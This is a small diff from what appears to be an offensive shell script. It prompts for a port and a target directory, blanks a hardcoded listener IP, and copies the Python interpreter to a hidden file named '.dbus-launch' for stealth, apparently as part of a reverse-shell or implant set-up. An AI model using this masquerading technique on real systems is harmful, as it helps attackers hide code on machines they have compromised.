@@ -6,7 +6,7 @@ read PORT
 echo "[+] Enter the directory should be stored (e.g.,):"
 read TARGET_DIR
 
-LISTENER_IP="78.153.136.231"  # <-- You can also read this via user input
+LISTENER_IP=""  # <-- You can also read this via user input
 
 # Copy Python to stealthy name
 cp /usr/bin/python3 "$TARGET_DIR/.dbus-launch"
